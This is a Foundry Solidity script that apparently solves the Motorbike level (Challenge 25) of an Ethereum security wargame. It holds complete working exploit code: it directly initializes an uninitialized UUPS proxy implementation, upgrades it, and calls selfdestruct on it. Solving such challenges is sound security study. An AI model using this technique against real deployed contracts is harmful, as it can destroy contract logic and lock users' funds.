// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

/**
 * @title EngineDestroyer
 * @notice Minimal contract with a selfdestruct function for the Motorbike exploit
 */
contract EngineDestroyer {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}

/**
 * @title Challenge 25 Solution Script
 * @notice Initialize the engine directly and upgrade to a self-destructing implementation
 * @dev Read the engine address from the proxy's implementation slot
 */
contract MotorbikeSolution is Script {
    address constant INSTANCE = 0xc19EAe25fed90D583eF5862a103857923cC122Ee;
    // EIP-1967 implementation slot
    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        // Read the engine (implementation) address from the proxy's storage
        bytes32 implSlotValue = vm.load(INSTANCE, IMPL_SLOT);
        address engineAddress = address(uint160(uint256(implSlotValue)));
        console.log("Engine address:", engineAddress);

        vm.startBroadcast(deployerPrivateKey);

        // Step 1: Initialize the engine directly (not through proxy)
        IEngine(engineAddress).initialize();

        // Step 2: Deploy destroyer contract
        EngineDestroyer destroyer = new EngineDestroyer();

        // Step 3: Upgrade to destroyer and call destroy
        IEngine(engineAddress).upgradeToAndCall(
            address(destroyer),
            abi.encodeWithSelector(EngineDestroyer.destroy.selector)
        );

        vm.stopBroadcast();

        console.log("Challenge 25 completed! Engine self-destructed.");
    }
}
